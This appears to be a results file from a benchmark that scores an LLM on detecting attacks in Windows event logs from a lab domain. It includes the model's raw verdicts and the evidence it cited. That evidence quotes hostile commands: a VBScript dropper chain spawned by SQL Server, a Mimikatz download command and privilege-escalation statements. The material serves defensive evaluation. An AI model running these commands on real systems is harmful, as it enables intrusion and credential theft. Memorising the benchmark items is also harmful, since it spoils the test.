# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
gpt-5.5-2026-04-23,ID4698-4699-Fast created & deleted task by SMBexec (sups. arg.).evtx,easy,A,processed,YES,100.0,100.0,YES,"4698, 4699",C:\WINDOWS\Temp\MpCmdRun.bat,"admmig, OFFSEC\lambda-user",C:\WINDOWS\Temp\MpCmdRun.bat,fs02.offsec.lan,,0.0,10.11,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4698, 4699
- Processes: C:\WINDOWS\Temp\MpCmdRun.bat
- Accounts: admmig, OFFSEC\lambda-user
- Commands: C:\WINDOWS\Temp\MpCmdRun.bat
- Network: fs02.offsec.lan
- Registry: None

EXPLANATION:
A scheduled task named \smbservice was created and then deleted within the same second by admmig, indicating a short-lived execution mechanism rather than routine administration. The task was configured to run C:\WINDOWS\Temp\MpCmdRun.bat as S-1-5-18, and execution from C:\WINDOWS\Temp with immediate cleanup is consistent with suspicious attack behavior."
gpt-5.5-2026-04-23,ID5145-Remote schedule task creation (ATexec).evtx,easy,A,processed,YES,100.0,77.8,YES,5145,,admmig,,"fs01.offsec.lan, 10.23.123.11",,0.0,12.15,4.7,6.0,4.0,3,17.7,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5145
- Processes: None
- Accounts: admmig
- Commands: None
- Network: fs01.offsec.lan, 10.23.123.11
- Registry: None

EXPLANATION:
The same account admmig from 10.23.123.11 accessed \\*\IPC$ with RelativeTargetName atsvc and then accessed \\*\ADMIN$ targeting Temp\bouWFQYO.tmp on fs01.offsec.lan. This pattern of remote IPC$ atsvc access followed by ADMIN$ temporary file activity is consistent with malicious remote execution behavior rather than routine file access."
gpt-5.5-2026-04-23,ID4688-SQL Server payload injectection for reverse shell (MSF).evtx,easy,A,processed,YES,100.0,75.7,YES,4688,"C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\cscript.exe, C:\Users\SVC-SQ~1\AppData\Local\Temp\TVupu.exe, C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe",Svc-SQL-DB01,"\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, ""C:\Windows\system32\cmd.exe"" /c echo Set ofs = CreateObject(""Scripting.FileSystemObject"").OpenTextFile(""%TEMP%\TVupu.exe"", 2, True) &gt | &gt | %TEMP%\UbdXv.vbs &amp | echo ofs.Write data &gt | echo ofs.close &gt | echo Set shell = CreateObject(""Wscript.Shell"") &gt | echo shell.run ""%TEMP%\TVupu.exe"", 0, false &gt | echo Else &gt | echo Wscript.Echo ""The file is empty."" &gt | echo End If &gt | echo Function base64_decode(byVal strIn) &gt | echo Dim w1, w2, w3, w4, n, strOut &gt | echo For n = 1 To Len(strIn) Step 4 &gt | echo w1 = mimedecode(Mid(strIn, n, 1)) &gt | echo w2 = mimedecode(Mid(strIn, n + 1, 1)) &gt | echo w3 = mimedecode(Mid(strIn, n + 2, 1)) &gt | echo w4 = mimedecode(Mid(strIn, n + 3, 1)) &gt | echo If Not w2 Then _ &gt | echo strOut = strOut + Chr(((w1 * 4 + Int(w2 / 16)) And 255)) &gt | echo If  Not w3 Then _ &gt | echo strOut = strOut + Chr(((w2 * 16 + Int(w3 / 4)) And 255)) &gt | echo If Not w4 Then _ &gt | echo strOut = strOut + Chr(((w3 * 64 + w4) And 255)) &gt | echo Next &gt | echo base64_decode = strOut &gt | echo End Function &gt | echo Function mimedecode(byVal strIn) &gt | %TEMP%\UbdXv.vbs, ""C:\Windows\system32\cmd.exe"" /c echo Base64Chars = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"" &gt | echo If Len(strIn) = 0 Then &gt | echo mimedecode = -1 : Exit Function &gt | echo mimedecode = InStr(Base64Chars, strIn) - 1 &gt | cscript //nologo %TEMP%\UbdXv.vbs, cscript  //nologo C:\Users\SVC-SQ~1\AppData\Local\Temp\UbdXv.vbs, ""C:\Users\SVC-SQ~1\AppData\Local\Temp\TVupu.exe""",mssql01.offsec.lan,,16.7,62.48,4.5,6.0,3.3,3,16.8,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\cscript.exe, C:\Users\SVC-SQ~1\AppData\Local\Temp\TVupu.exe, C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe
- Accounts: Svc-SQL-DB01
- Commands: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1, ""C:\Windows\system32\cmd.exe"" /c echo Set ofs = CreateObject(""Scripting.FileSystemObject"").OpenTextFile(""%TEMP%\TVupu.exe"", 2, True) &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo ofs.Write data &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo ofs.close &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo Set shell = CreateObject(""Wscript.Shell"") &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo shell.run ""%TEMP%\TVupu.exe"", 0, false &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo Else &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo Wscript.Echo ""The file is empty."" &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo End If &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo Function base64_decode(byVal strIn) &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo Dim w1, w2, w3, w4, n, strOut &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo For n = 1 To Len(strIn) Step 4 &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo w1 = mimedecode(Mid(strIn, n, 1)) &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo w2 = mimedecode(Mid(strIn, n + 1, 1)) &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo w3 = mimedecode(Mid(strIn, n + 2, 1)) &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo w4 = mimedecode(Mid(strIn, n + 3, 1)) &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo If Not w2 Then _ &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo strOut = strOut + Chr(((w1 * 4 + Int(w2 / 16)) And 255)) &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo If  Not w3 Then _ &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo strOut = strOut + Chr(((w2 * 16 + Int(w3 / 4)) And 255)) &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo If Not w4 Then _ &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo strOut = strOut + Chr(((w3 * 64 + w4) And 255)) &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo Next &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo base64_decode = strOut &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo End Function &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo Function mimedecode(byVal strIn) &gt;&gt;%TEMP%\UbdXv.vbs, ""C:\Windows\system32\cmd.exe"" /c echo Base64Chars = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"" &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo If Len(strIn) = 0 Then &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo mimedecode = -1 : Exit Function &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo Else &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo mimedecode = InStr(Base64Chars, strIn) - 1 &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo End If &gt;&gt;%TEMP%\UbdXv.vbs &amp; echo End Function &gt;&gt;%TEMP%\UbdXv.vbs &amp; cscript //nologo %TEMP%\UbdXv.vbs, cscript  //nologo C:\Users\SVC-SQ~1\AppData\Local\Temp\UbdXv.vbs, ""C:\Users\SVC-SQ~1\AppData\Local\Temp\TVupu.exe"" 
- Network: mssql01.offsec.lan
- Registry: None

EXPLANATION:
The events show C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe spawning many C:\Windows\System32\cmd.exe processes under Svc-SQL-DB01 to append base64 content into %TEMP%\feyQV.b64 and build %TEMP%\UbdXv.vbs. The VBScript is then executed by C:\Windows\System32\cscript.exe to decode and run C:\Users\SVC-SQ~1\AppData\Local\Temp\TVupu.exe, which is a malicious staging and execution pattern from the SQL Server service context."
gpt-5.5-2026-04-23,ID4688-Edge payload download via command.evtx,easy,A,processed,YES,100.0,78.6,YES,4688,"C:\Program Files\Microsoft\Edge\Application\msedge.exe, C:\Windows\System32\timeout.exe, C:\Windows\System32\SecurityHealthHost.exe, C:\Windows\System32\taskkill.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\svchost.exe","admmig, WIN10-02$","""C:\Program Files\Microsoft\Edge\Application\msedge.exe""  https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip , timeout  3 , ""C:\Program Files\Microsoft\Edge\Application\msedge.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\admmig\AppData\Local\Microsoft\Edge\User Data"" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\admmig\AppData\Local\Microsoft\Edge\User Data\Crashpad"" --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=96.0.4664.110 ""--annotation=exe=C:\Program Files\Microsoft\Edge\Application\msedge.exe"" --annotation=plat=Win64 ""--annotation=prod=Microsoft Edge"" --annotation=ver=96.0.1054.62 --initial-client-data=0xf0,0xf4,0xf8,0xa4,0xfc,0x7ffa3209a740,0x7ffa3209a750,0x7ffa3209a760, ""C:\Program Files\Microsoft\Edge\Application\msedge.exe"" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --field-trial-handle=2000,7126420810095964733,2611010335910673961,131072 --disable-gpu-compositing --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=14 --mojo-platform-channel-handle=5856 /prefetch:1, C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding, ""C:\Program Files\Microsoft\Edge\Application\msedge.exe"" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --field-trial-handle=2000,7126420810095964733,2611010335910673961,131072 --disable-gpu-compositing --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=16 --mojo-platform-channel-handle=4376 /prefetch:1, taskkill  /IM ""msedge.exe"" /F","win10-02.offsec.lan, github.com",,0.0,19.01,4.7,5.0,4.0,2,15.7,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, C:\Windows\System32\timeout.exe, C:\Windows\System32\SecurityHealthHost.exe, C:\Windows\System32\taskkill.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\svchost.exe
- Accounts: admmig, WIN10-02$
- Commands: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""  https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip , timeout  3 , ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=crashpad-handler ""--user-data-dir=C:\Users\admmig\AppData\Local\Microsoft\Edge\User Data"" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\admmig\AppData\Local\Microsoft\Edge\User Data\Crashpad"" --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=96.0.4664.110 ""--annotation=exe=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --annotation=plat=Win64 ""--annotation=prod=Microsoft Edge"" --annotation=ver=96.0.1054.62 --initial-client-data=0xf0,0xf4,0xf8,0xa4,0xfc,0x7ffa3209a740,0x7ffa3209a750,0x7ffa3209a760, ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --field-trial-handle=2000,7126420810095964733,2611010335910673961,131072 --disable-gpu-compositing --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=14 --mojo-platform-channel-handle=5856 /prefetch:1, C:\Windows\System32\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding, ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=renderer --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --field-trial-handle=2000,7126420810095964733,2611010335910673961,131072 --disable-gpu-compositing --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=16 --mojo-platform-channel-handle=4376 /prefetch:1, taskkill  /IM ""msedge.exe"" /F
- Network: win10-02.offsec.lan, github.com
- Registry: None

EXPLANATION:
The account admmig launched Microsoft Edge from C:\Windows\System32\cmd.exe with a command line pointing to https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip. The sequence also includes timeout  3 followed by taskkill  /IM ""msedge.exe"" /F from the same parent process, indicating scripted download activity and cleanup around the Mimikatz download."
gpt-5.5-2026-04-23,ID5145-remote service creation over SMB.evtx,easy,A,processed,YES,100.0,77.8,YES,5145,powershell.exe,admmig,,"10.23.123.11, srvdefender01.offsec.lan",,0.0,9.43,4.7,5.0,4.0,3,16.7,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5145
- Processes: powershell.exe
- Accounts: admmig
- Commands: None
- Network: 10.23.123.11, srvdefender01.offsec.lan
- Registry: None

EXPLANATION:
The events show the account admmig accessing powershell.exe through \\*\ADMIN$ and svcctl through \\*\IPC$ from 10.23.123.11. This pattern is consistent with remote administrative service control paired with PowerShell access, which can indicate lateral movement or remote execution behavior."
gpt-5.5-2026-04-23,ID5145-service massive remote creation via named pipe - Tchopper.evtx,easy,A,processed,YES,100.0,83.3,YES,5145,,admmig,,"10.23.23.9, FS03.offsec.lan",,0.0,14.40,5.0,6.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5145
- Processes: None
- Accounts: admmig
- Commands: None
- Network: 10.23.23.9, FS03.offsec.lan
- Registry: None

EXPLANATION:
The logs show repeated Event ID 5145 access by admmig from 10.23.23.9 to \\*\IPC$ with RelativeTargetName svcctl on FS03.offsec.lan. While a single svcctl access can be administrative, the repeated pattern over several minutes indicates suspicious remote service control activity rather than routine file share access."
gpt-5.5-2026-04-23,"ID7000,7009,7045-Payload deployed via service - Tchopper.evtx",medium,A,processed,YES,100.0,66.7,YES,"7045, 7009, 7000, 7036","c:\windows\system32\cmd.exe, powershell",LocalSystem,"c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg1"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg245"" | select -Expand DisplayName |out-file -append tmp_payload.txt""",FS03.offsec.lan,,16.7,18.71,4.0,5.0,3.3,3,15.3,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 7045, 7009, 7000, 7036
- Processes: c:\windows\system32\cmd.exe, powershell
- Accounts: LocalSystem
- Commands: c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg1"" | select -Expand DisplayName |out-file -append tmp_payload.txt"", c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg245"" | select -Expand DisplayName |out-file -append tmp_payload.txt""
- Network: FS03.offsec.lan
- Registry: None

EXPLANATION:
The logs show many repeated 7045 service installation events running as LocalSystem where c:\windows\system32\cmd.exe launches powershell to read service DisplayName values and append them to tmp_payload.txt. The paired 7009 and 7000 failures across sequential service names indicate a coordinated pattern of service-based payload reconstruction rather than routine service activity."
gpt-5.5-2026-04-23,ID7009-Service deployment time out (meterpreter).evtx,easy,B,processed,YES,100.0,100.0,YES,7009,,,,FS03.offsec.lan,,0.0,11.00,6.0,6.0,4.0,2,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 7009
- Processes: None
- Accounts: None
- Commands: None
- Network: FS03.offsec.lan
- Registry: None

EXPLANATION:
Multiple Service Control Manager timeout events occurred on FS03.offsec.lan within a short period for randomly named services: gdKhvCScykzNFZKd, JyZPMMxJQxHFDMHV, and ItUrroruwhZwMrnl. This repeated pattern of failed service starts with random-looking identifiers is consistent with suspicious service-based execution activity rather than routine service behavior."
gpt-5.5-2026-04-23,ID33205-SQL Server member added to database role.evtx,easy,A,processed,YES,100.0,93.8,YES,33205,,"OFFSEC\admmig, dbo, test-sql",ALTER ROLE [db_accessadmin] ADD MEMBER [test-sql,mssql01.offsec.lan,,0.0,13.31,5.6,2.0,4.0,3,14.6,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 33205
- Processes: None
- Accounts: OFFSEC\admmig, dbo, test-sql
- Commands: ALTER ROLE [db_accessadmin] ADD MEMBER [test-sql]
- Network: mssql01.offsec.lan
- Registry: None

EXPLANATION:
The event shows a succeeded database role membership change where OFFSEC\admmig added test-sql to the db_accessadmin role. Granting db_accessadmin membership is a privilege change that can enable control over database access, indicating malicious privilege escalation behavior based on the logged statement."
gpt-5.5-2026-04-23,ID33205-SQL Server member added to server role.evtx,easy,A,processed,YES,100.0,93.8,YES,33205,,"OFFSEC\admmig, dbo, test-sql",ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql,mssql01.offsec.lan,,0.0,8.82,5.6,5.0,4.0,3,17.6,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 33205
- Processes: None
- Accounts: OFFSEC\admmig, dbo, test-sql
- Commands: ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql]
- Network: mssql01.offsec.lan
- Registry: None

EXPLANATION:
The event shows OFFSEC\admmig successfully executed ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql] on the master database. Adding test-sql to the sysadmin role is a high-privilege change and indicates potential privilege escalation behavior."
gpt-5.5-2026-04-23,ID33205-SQL Server user linked to a database.evtx,easy,A,processed,NO,100.0,88.9,YES,33205,,"OFFSEC\admmig, dbo, test-sql",CREATE USER [test-sql] FOR LOGIN [test-sql,mssql01.offsec.lan,,0.0,7.76,5.3,5.0,4.0,2,16.3,B,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 33205
- Processes: None
- Accounts: OFFSEC\admmig, dbo, test-sql
- Commands: CREATE USER [test-sql] FOR LOGIN [test-sql]
- Network: mssql01.offsec.lan
- Registry: None

EXPLANATION:
The event shows a successful SQL Server audit event where OFFSEC\admmig created a database user test-sql for login test-sql in RCS-TEST-db. In isolation, this is an administrative database user creation action, and there is no additional evidence in the provided data showing malicious behavior or an attack pattern."
gpt-5.5-2026-04-23,ID4688-SPN added to an account.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe","lambda-user, offsec\honey-pot1","SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*","jump01.offsec.lan, HACK-ME-PC.offsec.lan",,0.0,10.74,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe
- Accounts: lambda-user, offsec\honey-pot1
- Commands: SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*
- Network: jump01.offsec.lan, HACK-ME-PC.offsec.lan
- Registry: None

EXPLANATION:
The same account, lambda-user, executed setspn.exe from cmd.exe to add an MSSQLSvc SPN for offsec\honey-pot1 and then queried SPNs in the offsec domain. This sequence indicates suspicious SPN manipulation followed by SPN enumeration rather than routine isolated activity."
gpt-5.5-2026-04-23,ID4723-5145-password reset with changeNTLM (Mimikatz).evtx,easy,A,processed,NO,100.0,100.0,YES,4723,,"hacker2, admmig",,rootdc1.offsec.lan,,0.0,12.40,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4723
- Processes: None
- Accounts: hacker2, admmig
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
Event ID 4723 shows a password change attempt involving TargetUserName hacker2 and SubjectUserName admmig. With only this single event and no related commands, processes, registry activity, or additional escalation pattern in the provided data, this is not sufficient to identify attack behavior."
gpt-5.5-2026-04-23,ID4724-5145-password reset with setNTLM (Mimikatz).evtx,easy,A,processed,YES,100.0,88.9,YES,"4624, 5145, 4724, 4738",Kerberos,"admmig, hacker2, ROOTDC1$",,"rootdc1.offsec.lan, 10.23.23.9, fe80::1cae:5aa4:9d8d:106a",,0.0,12.18,5.3,6.0,4.0,3,18.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4624, 5145, 4724, 4738
- Processes: Kerberos
- Accounts: admmig, hacker2, ROOTDC1$
- Commands: None
- Network: rootdc1.offsec.lan, 10.23.23.9, fe80::1cae:5aa4:9d8d:106a
- Registry: None

EXPLANATION:
The logs show repeated Kerberos network logons by admmig from 10.23.23.9 to rootdc1.offsec.lan, followed by IPC$ access to samr. Immediately afterward, admmig reset the password for hacker2 and the account was changed with PasswordLastSet updated, which is suspicious account manipulation consistent with attack behavior."
gpt-5.5-2026-04-23,ID4728-4756-Member added to sensitive domain groups.evtx,easy,A,processed,YES,100.0,92.9,YES,"4728, 4756",,"lambda-user, Domain Admins, Enterprise Admins, Enterprise Key Admins, Schema Admins, honey-pot1",,rootdc1.offsec.lan,,0.0,11.67,5.6,5.0,4.0,2,16.6,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4728, 4756
- Processes: None
- Accounts: lambda-user, Domain Admins, Enterprise Admins, Enterprise Key Admins, Schema Admins, honey-pot1
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
lambda-user added CN=honey-pot1,OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan to multiple highly privileged groups in rapid succession, including Domain Admins, Enterprise Admins, Enterprise Key Admins, and Schema Admins. This pattern indicates privilege escalation rather than routine administration."
gpt-5.5-2026-04-23,ID4728-Massive account group membership change.evtx,easy,A,processed,YES,100.0,96.2,YES,4728,,"CN=hack-adm-hack, OU=Test-OU, OU=OFFSEC-COMPANY, DC=offsec, DC=lan, Group01, Group02, Group03, Group04, Group05, Group06, Group07, Group08, Group09, Group10, Group11, lambda-user",,rootdc1.offsec.lan,,0.0,12.30,5.8,6.0,4.0,4,19.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4728
- Processes: None
- Accounts: CN=hack-adm-hack,OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan, Group01, Group02, Group03, Group04, Group05, Group06, Group07, Group08, Group09, Group10, Group11, lambda-user
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
Event ID 4728 appears repeatedly within the same second, with lambda-user adding CN=hack-adm-hack,OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan to Group01 through Group11. The rapid series of group membership additions by the same account and SubjectLogonId indicates suspicious privilege or access expansion rather than routine single-group administration."
gpt-5.5-2026-04-23,ID4728-Member adding to a group by the same account.evtx,easy,A,processed,NO,100.0,66.7,YES,4728,,lambda-user,,rootdc1.offsec.lan,,0.0,10.05,4.0,1.0,4.0,2,11.0,C,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4728
- Processes: None
- Accounts: lambda-user
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The event shows lambda-user was added to Group02 by lambda-user. Based only on the provided data, there is no process, command, registry, or network activity indicating attack behavior, and Group02 is not identified as a privileged group in the log."
gpt-5.5-2026-04-23,ID4732-4733-Quick added-removed user from local group.evtx,easy,A,processed,YES,100.0,100.0,YES,"4732, 4733",,"admmig, Users, Administrators, Backup Operators",,jump01.offsec.lan,,0.0,7.82,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4732, 4733
- Processes: None
- Accounts: admmig, Users, Administrators, Backup Operators
- Commands: None
- Network: jump01.offsec.lan
- Registry: None

EXPLANATION:
The logs show admmig adding the same MemberSid to Users, Administrators, and Backup Operators, then removing it from Administrators and Backup Operators shortly afterward. This paired add/remove pattern on privileged local groups indicates temporary privilege escalation behavior rather than routine activity."
gpt-5.5-2026-04-23,ID4732-DNSadmin new member added.evtx,easy,A,processed,YES,100.0,83.3,YES,4732,,"Test-ADM, DnsAdmins, admmig",,rootdc1.offsec.lan,,0.0,9.69,5.0,5.0,4.0,3,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4732
- Processes: None
- Accounts: Test-ADM, DnsAdmins, admmig
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
Event ID 4732 shows CN=Test-ADM,CN=Users,DC=offsec,DC=lan was added to the DnsAdmins group by admmig. Adding an account to DnsAdmins is a privileged group membership change and is consistent with privilege escalation behavior."
gpt-5.5-2026-04-23,ID4732-User added to local admin groups.evtx,easy,A,processed,YES,100.0,62.5,YES,4732,,admmig,,jump01.offsec.lan,,0.0,12.92,3.8,5.0,4.0,3,15.8,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4732
- Processes: None
- Accounts: admmig
- Commands: None
- Network: jump01.offsec.lan
- Registry: None

EXPLANATION:
The logs show the same SubjectUserName, admmig, adding the same MemberSid to multiple Builtin groups on jump01.offsec.lan. Adding a member to Administrators and Backup Operators in sequence indicates privilege escalation behavior rather than routine activity."
